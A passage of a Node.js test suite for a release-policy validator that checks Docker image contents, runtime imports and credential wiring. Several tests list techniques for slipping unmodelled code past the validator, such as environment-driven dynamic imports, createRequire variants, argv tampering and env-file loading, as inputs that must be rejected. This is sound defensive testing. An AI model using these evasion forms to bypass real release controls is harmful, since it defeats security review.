import assert from 'node:assert/strict';
import {
  mkdtemp,
  mkdir,
  readFile,
  rm,
  symlink,
  writeFile,
} from 'node:fs/promises';
import os from 'node:os';
import path from 'node:path';
import test from 'node:test';

import { RELEASE_GATES } from '../lib/release-gates.mjs';
import {
  releasePolicyInternals,
  validateReleasePolicy,
} from '../lib/release-policy.mjs';
import { runReleaseVerification } from '../verify-release.mjs';

const APPROVED_IMAGE =
  'postgres:16-alpine@sha256:57c72fd2a128e416c7fcc499958864df5301e940bca0a56f58fddf30ffc07777';
const RUNTIME_CREDENTIAL_COPY =
  'COPY --from=builder --chown=nextjs:nodejs /app/src/lib/runtime-credentials.js ./src/lib/runtime-credentials.js';
const STANDALONE_RUNTIME_COPY = 'COPY --from=builder /app/.next/standalone ./';
const STARTUP_RUNTIME_COPY =
  'COPY --from=builder --chown=nextjs:nodejs /app/scripts/start-standalone.mjs ./scripts/start-standalone.mjs';
const ZOD_RUNTIME_COPY =
  'COPY --from=builder --chown=nextjs:nodejs /app/node_modules/zod ./node_modules/zod';
const RUNTIME_SETUP_RUN = [
  'RUN apk add --no-cache dumb-init=1.2.5-r4',
  '&& rm -rf /usr/local/lib/node_modules/npm',
  '/usr/local/lib/node_modules/corepack /opt/yarn-*',
  '&& rm -f /usr/local/bin/npm /usr/local/bin/npx',
  '/usr/local/bin/corepack /usr/local/bin/yarn /usr/local/bin/yarnpkg',
  '&& addgroup --system --gid 1001 nodejs',
  '&& adduser --system --uid 1001 --ingroup nodejs nextjs',
].join(' ');
const RUNTIME_HARDENING_RUN = [
  'RUN mkdir -p /app/.next/cache/images',
  '&& find /app -type d -exec chmod 0555 {} +',
  '&& find /app -type f -exec chmod 0444 {} +',
  '&& chmod 0555 /app/server.js',
  '&& chown nextjs:nodejs /app/.next/cache/images',
  '&& chmod 0750 /app/.next/cache/images',
].join(' ');
const RUNTIME_USER = 'USER 1001:1001';
const RUNTIME_ENTRYPOINT = 'ENTRYPOINT ["/usr/bin/dumb-init", "--"]';
const RUNTIME_COMMAND = 'CMD ["node", "scripts/start-standalone.mjs", "server.js"]';
const RUNTIME_HEALTHCHECK = [
  'HEALTHCHECK --interval=30s --timeout=4s',
  '--start-period=15s --retries=3',
  'CMD wget --quiet --spider',
  'http://127.0.0.1:3000/api/health/ready || exit 1',
].join(' ');
const RUNTIME_ENV = [
  'ENV NODE_ENV=production',
  'NEXT_TELEMETRY_DISABLED=1',
  'NEXT_PUBLIC_SITE_URL=${NEXT_PUBLIC_SITE_URL}',
  'BUILD_SITE_URL=${NEXT_PUBLIC_SITE_URL}',
  'HOSTNAME=0.0.0.0',
  'PORT=3000',
].join(' ');

async function writeRelative(root, relative, contents) {
  const destination = path.join(root, relative);
  await mkdir(path.dirname(destination), { recursive: true });
  await writeFile(destination, contents, { encoding: 'utf8', mode: 0o600 });
}

async function createBaselineFixture() {
  const root = await mkdtemp(path.join(os.tmpdir(), 'release-policy-'));
  const packageJson = {
    scripts: { ...releasePolicyInternals.expectedPackageScripts },
    dependencies: { zod: '0.0.0' },
    devDependencies: {},
  };
  await writeRelative(root, 'package.json', `${JSON.stringify(packageJson, null, 2)}\n`);
  await writeRelative(root, 'node_modules/zod/package.json', `${JSON.stringify({
    name: 'zod',
    version: '0.0.0',
    type: 'module',
    exports: {
      '.': './index.js',
      './a-valid': './index.js',
    },
  }, null, 2)}\n`);
  await writeRelative(root, 'node_modules/zod/index.js', 'export const z = {};\n');
  await writeRelative(root, 'Makefile', 'PROFILE ?= development\n');
  await writeRelative(
    root,
    'scripts/system-orchestrator.sh',
    '#!/usr/bin/env bash\nPROFILE="development"\n# Runtime profile (default: development)\nexport HOSTNAME="127.0.0.1"\n',
  );
  await writeRelative(root, 'scripts/ensure-pepper.js', 'const SECURITY_PEPPER = true;\n');
  await writeRelative(root, 'scripts/install-systemd-services.sh', [
    'ADMIN_JWT_SECRET=',
    'ADMIN_DASH_SECRET=',
    'GUEST_JWT_SECRET=',
    '',
  ].join('\n'));
  await writeRelative(root, 'scripts/README.md', [
    'Active production credentials:',
    'ADMIN_JWT_SECRET ADMIN_DASH_SECRET GUEST_JWT_SECRET',
    '',
  ].join('\n'));
  await writeRelative(root, 'SECURITY.md', 'Runtime credentials follow the maintained contract.\n');
  await writeRelative(root, '.env.example', [
    'DATABASE_URL=',
    'ADMIN_JWT_SECRET=',
    'ADMIN_DASH_SECRET=',
    'GUEST_JWT_SECRET=',
    '',
  ].join('\n'));
  await writeRelative(
    root,
    'scripts/verify-release.mjs',
    [
      "import { spawn } from 'node:child_process';",
      "import { RELEASE_GATES } from './lib/release-gates.mjs';",
      "const passthrough = ['GITLEAKS_BIN'];",
      "spawn('node', ['--version'], { shell: false });",
      'void RELEASE_GATES; void passthrough;',
      '',
    ].join('\n'),
  );
  await writeRelative(root, '.dockerignore', '.env\n.env.*\n!.env.example\n');
  await writeRelative(
    root,
    'config/secret-scanning/tool.lock.json',
    `${JSON.stringify(releasePolicyInternals.expectedSecretToolLock, null, 2)}\n`,
  );
  await writeRelative(
    root,
    'config/secret-scanning/historical-incident-baseline.json',
    `${JSON.stringify({
      schemaVersion: 1,
      incident: 'IR-01',
      status: 'COMPLETE_CONTAINED',
      findings: releasePolicyInternals.expectedHistoricalSecretBaseline.map(
        ([classification, fingerprint]) => ({ classification, fingerprint }),
      ),
    }, null, 2)}\n`,
  );
  await writeRelative(
    root,
    'config/secret-scanning/current-fixture-allowlist.json',
    `${JSON.stringify({
      schemaVersion: 1,
      findings: releasePolicyInternals.expectedCurrentSecretFixtures.map(
        ([classification, filePath, rule, line, column]) => ({
          classification,
          path: filePath,
          rule,
          line,
          column,
        }),
      ),
    }, null, 2)}\n`,
  );
  await writeRelative(root, 'config/secret-scanning/gitleaks.toml', [
    '[extend]',
    'useDefault = true',
    'credential-bearing-database-url',
    'private-key-material',
    '',
  ].join('\n'));
  await writeRelative(root, 'scripts/check-secrets.mjs', [
    "const args = ['--report-path'];",
    'const reportOptions = { mode: 0o600 };',
    'await rm(reportPath, { force: true });',
    'classifyGeneratedArtifactFinding();',
    "const git = 'git'; const command = 'ls-files';",
    "const files = ['current-fixture-allowlist.json', 'historical-incident-baseline.json'];",
    "const artifacts = ['.next/standalone'];",
    'const ENV_FILE_PATTERN = /env/u;',
    "const GITLEAKS_BIN = 'GITLEAKS_BIN';",
    "const binarySha256 = 'binarySha256';",
    'function formatFinding() {}',
    'void args; void git; void command; void files; void artifacts;',
    'void ENV_FILE_PATTERN; void GITLEAKS_BIN; void binarySha256; void formatFinding;',
    '',
  ].join('\n'));
  await writeRelative(
    root,
    'docs/security/secret-scanning.md',
    'Sanitized IR-01 secret-scanning contract.\n',
  );
  await writeRelative(root, 'docs/security/claim-token-transport.md', 'Claim transport contract.\n');
  const compose = `services:\n  db:\n    image: ${APPROVED_IMAGE}\n`;
  await writeRelative(root, 'docker-compose.yml', compose);
  await writeRelative(root, 'docker/docker-compose.prod.yml', compose);
  await writeRelative(root, 'docker/Dockerfile.security', [
    'FROM node:22-alpine AS builder',
    'WORKDIR /app',
    'FROM node:22-alpine AS runner',
    RUNTIME_SETUP_RUN,
    'WORKDIR /app',
    RUNTIME_ENV,
    STANDALONE_RUNTIME_COPY,
    STARTUP_RUNTIME_COPY,
    'COPY --from=builder --chown=nextjs:nodejs /app/src/lib/runtime-env-schema.js ./src/lib/runtime-env-schema.js',
    RUNTIME_CREDENTIAL_COPY,
    ZOD_RUNTIME_COPY,
    RUNTIME_HARDENING_RUN,
    RUNTIME_USER,
    RUNTIME_HEALTHCHECK,
    RUNTIME_ENTRYPOINT,
    RUNTIME_COMMAND,
    '',
  ].join('\n'));
  await writeRelative(
    root,
    'tests/integration/support/postgres-image-policy.ts',
    [
      "export const APPROVED_POSTGRES_REPOSITORY = 'postgres';",
      "export const APPROVED_POSTGRES_TAG = '16-alpine';",
      "export const APPROVED_POSTGRES_INDEX_DIGEST =",
      "  'sha256:57c72fd2a128e416c7fcc499958864df5301e940bca0a56f58fddf30ffc07777';",
      '',
    ].join('\n'),
  );
  await writeRelative(root, 'deploy/nginx/cloudflare-ips.json', JSON.stringify({
    version: 1,
    ipv4: ['203.0.113.0/24'],
    ipv6: ['2001:db8::/32'],
  }));
  await writeRelative(root, 'deploy/nginx/includes/cloudflare-realip.conf', 'set_real_ip_from 203.0.113.0/24;\n');
  await writeRelative(root, 'deploy/nginx/includes/cloudflare-geo.conf', '203.0.113.0/24 1;\n');
  await writeRelative(root, 'deploy/nginx/image.lock.json', JSON.stringify({
    repository: 'docker.io/library/nginx',
    digest: 'sha256:a8b39bd9cf0f83869a2162827a0caf6137ddf759d50a171451b335cecc87d236',
    mediaType: 'application/vnd.oci.image.index.v1+json',
  }));
  await writeRelative(root, 'deploy/nginx/nginx.conf.template', [
    'include /etc/nginx/trusted-ingress/cloudflare-realip.conf;',
    'real_ip_header CF-Connecting-IP;',
    'geo $realip_remote_addr $cloudflare_source {',
    '  include /etc/nginx/trusted-ingress/cloudflare-geo.conf;',
    '}',
    'upstream next_app { server 127.0.0.1:3000; }',
    'proxy_set_header CF-Connecting-IP $verified_client_ip;',
    'proxy_set_header X-Real-IP $verified_client_ip;',
    'proxy_set_header X-Forwarded-For $verified_client_ip;',
    'proxy_set_header Forwarded "";',
    'proxy_set_header X-Origin-Verified-Client-IP $verified_client_ip;',
    'proxy_set_header X-Origin-Proxy-Attestation $origin_proxy_attestation;',
    'ssl_client_certificate /etc/nginx/tls/cloudflare-origin-pull-ca.pem;',
    'ssl_verify_client on;',
    'limit_req_zone $auth_rate_key zone=auth_operations:10m rate=5r/s;',
    'limit_req_zone $public_write_rate_key zone=public_writes:10m rate=10r/s;',
    'limit_req_zone $broad_api_rate_key zone=broad_api:10m rate=30r/s;',
    'limit_conn_zone $binary_remote_addr zone=per_client_connections:10m;',
    'limit_req zone=auth_operations burst=20 nodelay;',
    'limit_req zone=public_writes burst=40 nodelay;',
    'limit_req zone=broad_api burst=60 nodelay;',
    'limit_req_dry_run on;',
    'limit_conn_dry_run on;',
    'limit_req_status 429;',
    'limit_conn per_client_connections 20;',
    'limit_conn_status 429;',
    'log_format safe "limit_req=$limit_req_status limit_conn=$limit_conn_status";',
    'log_format claim_safe "$uri";',
    '',
  ].join('\n'));
  await writeRelative(root, 'deploy/systemd/qr-city-guide.service', [
    'Environment=HOSTNAME=127.0.0.1',
    'Environment=PORT=3000',
    '',
  ].join('\n'));
  await writeRelative(root, 'src/lib/runtime-env-schema.js', [
    "import { z } from 'zod';",
    'import {',
    '  ACTIVE_RUNTIME_CREDENTIAL_NAMES,',
    '  runtimeCredentialIssue,',
    "} from './runtime-credentials.js';",
    'const credentialOwners = new Map();',
    'const message = "must differ from";',
    "const originContract = 'ORIGIN_PROXY_SHARED_SECRET';",
    "const format = '64-character hexadecimal secret non-placeholder';",
    'export const runtimeEnvSchema = {',
    '  parse(environment) {',
    '    void environment; void z; void ACTIVE_RUNTIME_CREDENTIAL_NAMES;',
    '    void runtimeCredentialIssue; void credentialOwners; void message;',
    '    void originContract; void format;',
    '  },',
    '};',
    '',
  ].join('\n'));
  await writeRelative(root, 'src/lib/runtime-credentials.js', [
    'export const ACTIVE_RUNTIME_CREDENTIAL_NAMES = [',
    "  'ADMIN_JWT_SECRET',",
    "  'GUEST_JWT_SECRET',",
    "  'ADMIN_DASH_SECRET',",
    '];',
    'const MINIMUM_ESTIMATED_ENTROPY_BITS = 160;',
    'const MINIMUM_DISTINCT_CHARACTERS = 12;',
    "const PLACEHOLDER_TERMS = new Set(['placeholder']);",
    'function isPlaceholderLike() {}',
    'function hasRepeatedPattern() {}',
    'export function runtimeCredentialIssue() {}',
    'function readRuntimeCredential() {}',
    'void MINIMUM_ESTIMATED_ENTROPY_BITS; void MINIMUM_DISTINCT_CHARACTERS;',
    'void PLACEHOLDER_TERMS; void isPlaceholderLike; void hasRepeatedPattern;',
    'void readRuntimeCredential;',
    '',
  ].join('\n'));
  await writeRelative(root, 'src/lib/auth/admin.ts', [
    "readRuntimeCredential('ADMIN_JWT_SECRET');",
    '',
  ].join('\n'));
  await writeRelative(root, 'src/lib/guestSession.ts', [
    "readRuntimeCredential('GUEST_JWT_SECRET');",
    '',
  ].join('\n'));
  await writeRelative(root, 'src/app/api/admin/login/route.ts', [
    "readRuntimeCredential('ADMIN_DASH_SECRET');",
    '',
  ].join('\n'));
  await writeRelative(root, 'scripts/start-standalone.mjs', [
    "import { resolve } from 'node:path';",
    "import { pathToFileURL } from 'node:url';",
    "import { z } from 'zod';",
    "import { runtimeEnvSchema } from '../src/lib/runtime-env-schema.js';",
    'const serverPath = process.argv[2];',
    'runtimeEnvSchema.parse(process.env);',
    'process.exitCode = 78;',
    'void resolve; void pathToFileURL; void z;',
    'await import(pathToFileURL(resolve(serverPath)).href);',
    '',
  ].join('\n'));
  await writeRelative(root, 'scripts/test-runtime-credential-contract.mjs', [
    'SYNTHETIC_PRODUCTION_ENVIRONMENT',
    "['missing'",
    "['invalid'",
    "['identical'",
    "['valid'",
    'output must not expose credentials',
    '',
  ].join('\n'));
  await writeRelative(
    root,
    'docs/security/runtime-credential-contract.md',
    'Maintained runtime credential contract.\n',
  );
  await writeRelative(root, 'src/lib/net/getClientIp.ts', [
    "import { timingSafeEqual } from 'node:crypto';",
    "const ip = 'x-origin-verified-client-ip';",
    "const attestation = 'x-origin-proxy-attestation';",
    'void timingSafeEqual; void ip; void attestation;',
    '',
  ].join('\n'));
  await writeRelative(root, 'src/lib/portalClaimExchange.ts', [
    "const options = { httpOnly: true, secure: process.env.NODE_ENV === 'production',",
    "sameSite: 'strict', path: '/api/portal', maxAge: 0 };",
    'const PORTAL_CLAIM_EXCHANGE_MAX_AGE_SECONDS = 300;',
    'const grantLifetimeSeconds = 60;',
    "const headers = ['cache-control', 'no-referrer'];",
    'void options; void PORTAL_CLAIM_EXCHANGE_MAX_AGE_SECONDS;',
    'void grantLifetimeSeconds; void headers;',
    '',
  ].join('\n'));
  await writeRelative(root, 'src/app/[locale]/guest/UnifiedGuestClient.tsx', [
    "current.searchParams.delete('claim');",
    "current.searchParams.delete('claimToken');",
    'window.history.replaceState(null, "", "/en/guest");',
    "const endpoint = '/api/portal/claim-exchange';",
    'void endpoint;',
    '',
  ].join('\n'));
  await writeRelative(root, 'src/app/api/portal/claim-exchange/route.ts', [
    'prepareBookingClaimExchange();',
    'createPortalClaimExchangeCookie();',
    'checkSensitiveRateLimit();',
    'readJsonBody();',
    '',
  ].join('\n'));
  await writeRelative(root, 'src/app/api/portal/claims/route.ts', [
    'readPortalClaimExchange();',
    'clearPresentedPortalClaimExchange();',
    '',
  ].join('\n'));
  await writeRelative(root, 'src/app/api/admin/bookings/[id]/claim-grants/route.ts', [
    "response.headers.set('cache-control', 'no-store');",
    "response.headers.set('referrer-policy', 'no-referrer');",
    '',
  ].join('\n'));
  await writeRelative(root, 'src/proxy.ts', [
    "if (/\\/guest/u.test(pathname)) response.headers.set('Referrer-Policy', 'no-referrer');",
    '',
  ].join('\n'));
  await writeRelative(
    root,
    'src/app/api/health/ready/route.ts',
    'async function databaseReady() { return true; }\nfunction checkReadiness() { return databaseReady(); }\n',
  );
  await writeRelative(root, 'src/lib/sensitiveRateLimit.ts', [
    'const prisma = { $transaction: async (callback) => callback({}) };',
    'const ApiErrorCode = { SERVICE_UNAVAILABLE: 503 };',
    'void prisma.$transaction; void ApiErrorCode.SERVICE_UNAVAILABLE;',
    '',
  ].join('\n'));
  await writeRelative(
    root,
    'src/lib/operationalMonitor.ts',
    'const prisma = { rateLimit: { deleteMany() {} } }; void prisma.rateLimit.deleteMany;\n',
  );
  await writeRelative(root, 'docs/security/layered-rate-limiting.md', [
    'Cloudflare Free public reads PostgreSQL dry-run 429 503 key cardinality',
    'false positives new reviewed ADR',
    '',
  ].join('\n'));
  await writeRelative(root, 'docs/deployment/origin-ingress-runbook.md', [
    'firewall IPv4 IPv6 Authenticated Origin Pull Full (strict) rollback rotation',
    '',
  ].join('\n'));
  return root;
}

async function withFixture(callback) {
  const root = await createBaselineFixture();
  try {
    return await callback(root);
  } finally {
    await rm(root, { recursive: true, force: true });
  }
}

async function mutatePackage(root, mutate) {
  const filePath = path.join(root, 'package.json');
  const packageJson = JSON.parse(await readFile(filePath, 'utf8'));
  mutate(packageJson);
  await writeFile(filePath, `${JSON.stringify(packageJson, null, 2)}\n`, 'utf8');
}

function assertRejected(errors, pattern) {
  assert.ok(errors.length > 0, 'temporary fixture unexpectedly passed');
  assert.match(errors.join('\n'), pattern);
}

function memoryWriter() {
  let contents = '';
  return {
    write(value) {
      contents += String(value);
    },
    contents() {
      return contents;
    },
  };
}

function fixtureGate(id, environment = 'base') {
  return {
    id,
    label: `Fixture ${id}`,
    command: 'node',
    args: ['--version', id],
    environment,
  };
}

test('accepts the restricted local-only release fixture', async () => {
  await withFixture(async (root) => {
    assert.deepEqual(await validateReleasePolicy(root), []);
  });
});

test('rejects an omitted repository-relative final-image dependency', async () => {
  await withFixture(async (root) => {
    const dockerfilePath = path.join(root, 'docker/Dockerfile.security');
    const dockerfile = await readFile(dockerfilePath, 'utf8');
    await writeFile(
      dockerfilePath,
      dockerfile.replace(`${RUNTIME_CREDENTIAL_COPY}\n`, ''),
      'utf8',
    );
    assertRejected(
      await validateReleasePolicy(root),
      /runtime module dependency is absent from the final image: src\/lib\/runtime-credentials\.js/u,
    );
  });
});

test('rejects a symlinked manually copied runtime module', async () => {
  await withFixture(async (root) => {
    const credentialPath = path.join(root, 'src/lib/runtime-credentials.js');
    const credentialSource = await readFile(credentialPath, 'utf8');
    await rm(credentialPath);
    await writeRelative(root, 'src/lib/runtime-credentials-real.js', credentialSource);
    await symlink('runtime-credentials-real.js', credentialPath);
    assertRejected(
      await validateReleasePolicy(root),
      /manually copied runtime module must be a regular file: src\/lib\/runtime-credentials\.js/u,
    );
  });
});

test('rejects unexpected transitive imports deterministically without source values', async () => {
  await withFixture(async (root) => {
    const credentialPath = path.join(root, 'src/lib/runtime-credentials.js');
    const credentialSource = await readFile(credentialPath, 'utf8');
    const privateFixtureValue = ['private', 'fixture', 'value', 'must', 'not', 'appear'].join('-');
    await writeFile(credentialPath, [
      credentialSource.trimEnd(),
      `const opaqueRuntimeValue = ${JSON.stringify(privateFixtureValue)};`,
      'void opaqueRuntimeValue;',
      "await import('./runtime-extra-b.js');",
      "require('./runtime-extra-a.cjs');",
      '',
    ].join('\n'), 'utf8');
    await writeRelative(root, 'src/lib/runtime-extra-a.cjs', 'module.exports = true;\n');
    await writeRelative(root, 'src/lib/runtime-extra-b.js', 'export const extraB = true;\n');

    const first = await validateReleasePolicy(root);
    const second = await validateReleasePolicy(root);
    assert.deepEqual(first, second);
    assert.deepEqual(first, [...first].sort());
    assertRejected(first, /runtime-extra-a\.cjs/u);
    assertRejected(first, /runtime-extra-b\.js/u);
    assert.equal(first.join('\n').includes(privateFixtureValue), false);
  });
});

test('rejects a non-literal dynamic import outside the modeled CMD target', async () => {
  await withFixture(async (root) => {
    const startupPath = path.join(root, 'scripts/start-standalone.mjs');
    const startupSource = await readFile(startupPath, 'utf8');
    await writeFile(
      startupPath,
      startupSource.replace(
        'await import(pathToFileURL(resolve(serverPath)).href);',
        'await import(process.env.RUNTIME_TARGET);',
      ),
      'utf8',
    );
    assertRejected(
      await validateReleasePolicy(root),
      /runtime module contains an unresolved dynamic import: scripts\/start-standalone\.mjs/u,
    );
  });
});

test('rejects dynamic import options and extra require arguments fail closed', async () => {
  for (const addition of [
    "await import('./runtime-extra.js', { with: { type: 'json' } });",
    "require('./runtime-extra.cjs', 'ignored');",
  ]) {
    await withFixture(async (root) => {
      const credentialPath = path.join(root, 'src/lib/runtime-credentials.js');
      const credentialSource = await readFile(credentialPath, 'utf8');
      await writeFile(
        credentialPath,
        `${credentialSource.trimEnd()}\n${addition}\n`,
        'utf8',
      );
      const errors = await validateReleasePolicy(root);
      assertRejected(
        errors,
        /non-literal require|unresolved dynamic import/u,
      );
    });
  }
});

test('rejects unmodeled CommonJS loader forms fail closed', async () => {
  for (const addition of [
    [
      "import { createRequire } from 'node:module';",
      'const loadRuntimeModule = createRequire(import.meta.url);',
      "loadRuntimeModule('./runtime-omitted.cjs');",
    ].join('\n'),
    [
      "const { createRequire } = await import('node:module');",
      'const loadRuntimeModule = createRequire(import.meta.url);',
      "loadRuntimeModule('./runtime-omitted.cjs');",
    ].join('\n'),
    [
      "import { Module } from 'node:module';",
      'const loadRuntimeModule = Module.createRequire(import.meta.url);',
      "loadRuntimeModule('./runtime-omitted.cjs');",
    ].join('\n'),
    [
      "const { createRequire } = process.getBuiltinModule('node:module');",
      'const loadRuntimeModule = createRequire(import.meta.url);',
      "loadRuntimeModule('./runtime-omitted.cjs');",
    ].join('\n'),
    [
      'const { getBuiltinModule } = process;',
      "const { createRequire } = getBuiltinModule('node:module');",
      'const loadRuntimeModule = createRequire(import.meta.url);',
      "loadRuntimeModule('./runtime-omitted.cjs');",
    ].join('\n'),
    "module.require('./runtime-omitted.cjs');",
    "module['require']('./runtime-omitted.cjs');",
    "require.call(null, './runtime-omitted.cjs');",
    "require.bind(null)('./runtime-omitted.cjs');",
    "require.resolve('./runtime-omitted.cjs');",
  ]) {
    await withFixture(async (root) => {
      const credentialPath = path.join(root, 'src/lib/runtime-credentials.js');
      const credentialSource = await readFile(credentialPath, 'utf8');
      await writeFile(
        credentialPath,
        `${credentialSource.trimEnd()}\n${addition}\n`,
        'utf8',
      );
      assertRejected(
        await validateReleasePolicy(root),
        /runtime module contains an unsupported loader: src\/lib\/runtime-credentials\.js/u,
      );
    });
  }
});

test('rejects unmodeled runtime-loaded data access fail closed', async () => {
  for (const addition of [
    [
      "import { readFileSync } from 'node:fs';",
      "readFileSync(new URL('./runtime-omitted.json', import.meta.url));",
    ].join('\n'),
    "process.loadEnvFile(new URL('./runtime-omitted.env', import.meta.url));",
    [
      'const { loadEnvFile } = process;',
      "loadEnvFile(new URL('./runtime-omitted.env', import.meta.url));",
    ].join('\n'),
  ]) {
    await withFixture(async (root) => {
      const credentialPath = path.join(root, 'src/lib/runtime-credentials.js');
      const credentialSource = await readFile(credentialPath, 'utf8');
      await writeFile(credentialPath, [
        credentialSource.trimEnd(),
        addition,
        '',
      ].join('\n'), 'utf8');
      assertRejected(
        await validateReleasePolicy(root),
        /runtime module contains unmodeled runtime data access: src\/lib\/runtime-credentials\.js/u,
      );
    });
  }
});

test('rejects mutable or shadowed CMD-derived loader bindings', async () => {
  for (const mutate of [
    (source) => source.replace(
      'const serverPath = process.argv[2];',
      'let serverPath = process.argv[2];\nserverPath = process.env.RUNTIME_TARGET;',
    ),
    (source) => source.replace(
      'await import(pathToFileURL(resolve(serverPath)).href);',
      [
        '{',
        '  const resolve = () => process.env.RUNTIME_TARGET;',
        '  await import(pathToFileURL(resolve(serverPath)).href);',
        '}',
      ].join('\n'),
    ),
    (source) => source.replace(
      'const serverPath = process.argv[2];',
      [
        "const process = { argv: ['node', 'wrapper', 'other.js'] };",
        'const serverPath = process.argv[2];',
      ].join('\n'),
    ),
    (source) => source.replace(
      'const serverPath = process.argv[2];',
      [
        'process.argv[2] = process.env.RUNTIME_TARGET;',
        'const serverPath = process.argv[2];',
      ].join('\n'),
    ),
    (source) => source.replace(
      'const serverPath = process.argv[2];',
      [
        "process.argv.splice(2, 1, 'other.js');",
        'const serverPath = process.argv[2];',
      ].join('\n'),
    ),
    (source) => source.replace(
      'const serverPath = process.argv[2];',
      [
        'const processAlias = globalThis.process;',
        "processAlias.argv[2] = 'other.js';",
        'const serverPath = process.argv[2];',
      ].join('\n'),
    ),
    (source) => source.replace(
      'const serverPath = process.argv[2];',
      [
        'const processAlias = process;',
        "processAlias.argv[2] = 'other.js';",
        'const serverPath = process.argv[2];',
      ].join('\n'),
    ),
    (source) => source.replace(
      "import { z } from 'zod';",
      [
        "import { z } from 'zod';",
        "import processAlias from 'node:process';",
        "processAlias.argv[2] = 'other.js';",
      ].join('\n'),
    ),
  ]) {
    await withFixture(async (root) => {
      const startupPath = path.join(root, 'scripts/start-standalone.mjs');
      const startupSource = await readFile(startupPath, 'utf8');
      await writeFile(startupPath, mutate(startupSource), 'utf8');
      assertRejected(
        await validateReleasePolicy(root),
        /runtime module contains (?:an unresolved dynamic import|an unsupported loader): scripts\/start-standalone\.mjs/u,
      );
    });
  }
});

test('rejects removal of the explicitly copied CMD runtime module', async () => {
  await withFixture(async (root) => {
    const dockerfilePath = path.join(root, 'docker/Dockerfile.security');
    const dockerfile = await readFile(dockerfilePath, 'utf8');
    await writeFile(
      dockerfilePath,
      dockerfile.replace(`${STARTUP_RUNTIME_COPY}\n`, ''),
      'utf8',
    );
    assertRejected(
      await validateReleasePolicy(root),
      /final Node runtime module must be explicitly copied: scripts\/start-standalone\.mjs/u,
    );
  });
});

test('rejects final WORKDIR drift from the packaged CMD runtime module', async () => {
  await withFixture(async (root) => {
    const dockerfilePath = path.join(root, 'docker/Dockerfile.security');
    const dockerfile = await readFile(dockerfilePath, 'utf8');
    await writeFile(
      dockerfilePath,
      dockerfile.replace(
        'CMD ["node", "scripts/start-standalone.mjs", "server.js"]',
        'WORKDIR /other\nCMD ["node", "scripts/start-standalone.mjs", "server.js"]',
      ),
      'utf8',
    );
    assertRejected(
      await validateReleasePolicy(root),
      /final Node runtime module must be explicitly copied/u,
    );
  });
});

test('rejects removal of the standalone tree that supplies the CMD target', async () => {
  await withFixture(async (root) => {
    const dockerfilePath = path.join(root, 'docker/Dockerfile.security');
    const dockerfile = await readFile(dockerfilePath, 'utf8');
    await writeFile(
      dockerfilePath,
      dockerfile.replace(`${STANDALONE_RUNTIME_COPY}\n`, ''),
      'utf8',
    );
    assertRejected(
      await validateReleasePolicy(root),
      /runtime module contains an unresolved dynamic import: scripts\/start-standalone\.mjs/u,
    );
  });
});

test('rejects a CMD target that is not the standalone root entrypoint', async () => {
  await withFixture(async (root) => {
    const dockerfilePath = path.join(root, 'docker/Dockerfile.security');
    const dockerfile = await readFile(dockerfilePath, 'utf8');
    await writeFile(
      dockerfilePath,
      dockerfile.replace(
        'CMD ["node", "scripts/start-standalone.mjs", "server.js"]',
        'CMD ["node", "scripts/start-standalone.mjs", "nested/server.js"]',
      ),
      'utf8',
    );
    assertRejected(
      await validateReleasePolicy(root),
      /runtime module contains an unresolved dynamic import: scripts\/start-standalone\.mjs/u,
    );
  });
});

test('rejects a missing authoritative builder-stage alias', async () => {
  await withFixture(async (root) => {
    const dockerfilePath = path.join(root, 'docker/Dockerfile.security');
    const dockerfile = await readFile(dockerfilePath, 'utf8');
    await writeFile(
      dockerfilePath,
      dockerfile.replace('FROM node:22-alpine AS builder', 'FROM node:22-alpine'),
      'utf8',
    );
    assertRejected(
      await validateReleasePolicy(root),
      /one distinct prior builder stage/u,
    );
  });
});

test('accepts Node built-ins without final-image copies', async () => {
  await withFixture(async (root) => {
    const credentialPath = path.join(root, 'src/lib/runtime-credentials.js');
    const credentialSource = await readFile(credentialPath, 'utf8');
    await writeFile(
      credentialPath,
      `${credentialSource.trimEnd()}\nimport test from 'node:test';\nvoid test;\n`,
      'utf8',
    );
    assert.deepEqual(await validateReleasePolicy(root), []);
  });
});

test('rejects a package import absent from the final runtime dependency tree', async () => {
  await withFixture(async (root) => {
    const dockerfilePath = path.join(root, 'docker/Dockerfile.security');
    const dockerfile = await readFile(dockerfilePath, 'utf8');
    await writeFile(
      dockerfilePath,
      dockerfile.replace(`${ZOD_RUNTIME_COPY}\n`, ''),
      'utf8',
    );
    assertRejected(
      await validateReleasePolicy(root),
      /runtime package is absent from the final-image dependency tree: zod/u,
    );
  });
});

test('resolves every imported package subpath before accepting its package root', async () => {
  await withFixture(async (root) => {
    const credentialPath = path.join(root, 'src/lib/runtime-credentials.js');
    const credentialSource = await readFile(credentialPath, 'utf8');
    await writeFile(credentialPath, [
      credentialSource.trimEnd(),
      "import 'zod/a-valid';",
      "import 'zod/z-missing';",
      '',
    ].join('\n'), 'utf8');
    assertRejected(
      await validateReleasePolicy(root),
      /runtime package must resolve from the installed dependency tree: zod/u,
    );
  });
});

test('recursively requires hoisted runtime package dependencies in the final image', async () => {
  await withFixture(async (root) => {
    const packagePath = path.join(root, 'package.json');
    const packageJson = JSON.parse(await readFile(packagePath, 'utf8'));
    packageJson.dependencies.alpha = '0.0.0';
    await writeFile(packagePath, `${JSON.stringify(packageJson, null, 2)}\n`, 'utf8');
    await writeRelative(root, 'node_modules/alpha/package.json', `${JSON.stringify({
      name: 'alpha',
      version: '0.0.0',
      type: 'module',
      exports: './index.js',
      dependencies: { beta: '0.0.0' },
    }, null, 2)}\n`);
    await writeRelative(root, 'node_modules/alpha/index.js', "import 'beta';\n");
    await writeRelative(root, 'node_modules/beta/package.json', `${JSON.stringify({
      name: 'beta',
      version: '0.0.0',
      type: 'module',
      exports: './index.js',
    }, null, 2)}\n`);
    await writeRelative(root, 'node_modules/beta/index.js', 'export const beta = true;\n');
    const credentialPath = path.join(root, 'src/lib/runtime-credentials.js');
    const credentialSource = await readFile(credentialPath, 'utf8');
    await writeFile(
      credentialPath,
      `${credentialSource.trimEnd()}\nimport 'alpha';\n`,
      'utf8',
    );
    const dockerfilePath = path.join(root, 'docker/Dockerfile.security');
    const dockerfile = await readFile(dockerfilePath, 'utf8');
    const alphaCopy =
      'COPY --from=builder /app/node_modules/alpha ./node_modules/alpha';
    const betaCopy =
      'COPY --from=builder /app/node_modules/beta ./node_modules/beta';
    await writeFile(
      dockerfilePath,
      dockerfile.replace(ZOD_RUNTIME_COPY, `${ZOD_RUNTIME_COPY}\n${alphaCopy}`),
      'utf8',
    );
    assertRejected(
      await validateReleasePolicy(root),
      /runtime package dependency is absent from the final-image dependency tree: alpha -> beta/u,
    );

    await writeFile(
